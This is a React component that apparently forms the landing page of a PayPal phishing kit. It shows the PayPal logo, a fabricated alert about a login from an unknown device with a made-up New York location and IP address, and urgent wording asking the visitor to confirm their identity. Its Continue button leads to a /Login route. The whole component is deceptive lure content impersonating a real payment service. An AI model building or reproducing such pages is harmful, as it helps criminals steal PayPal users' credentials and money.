import React from 'react';
import { useNavigate } from 'react-router-dom';
import './Home.css';
import payp from '../components/images/payp.png'

function Home() {
    const navigate = useNavigate();
    const nextPage = (e)=> {
        e.preventDefault();
        navigate('/Login');
    }
  return (
    <div className='home'>
        <div className='left'>
            <img src={payp} alt=''/>
            <h3>To help protect your account, we<br/>
                regularly look for early signs of<br/>
                potential fraudulent activities.
            </h3>
        </div>
        <div className='right'>
           <h1>     
            We want to make sure you're<br/>
            the owner of this account!!!
           </h1> 
           <h3>
            We didn't recognize a device or location
            that recently accessed your PayPal.<br/>
            We'd like to confirm your identity. 
           </h3>
        <div className='ip'>
        <table>
        <thead>
            <tr>
                <th>Login from unknown device<br/>Information</th>
                <th></th>
                <th>Location</th>
                <th></th>
                <th>IP</th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td></td>
                <td></td>
                <td>New York,<br/>USA</td>
                <td></td>
                <td>179.155.82.212</td>
                <td></td>
                <td></td>
            </tr>
        </tbody>
    </table>
           </div>
    <h3 className='warning'>
      Just to be safe, we want to make sure this
      is really you and not<br/> someone else using your  email address.
    </h3>
    <button className='btn' onClick={nextPage}>Continue</button>
        </div>
        
    </div>
  )
}

export default Home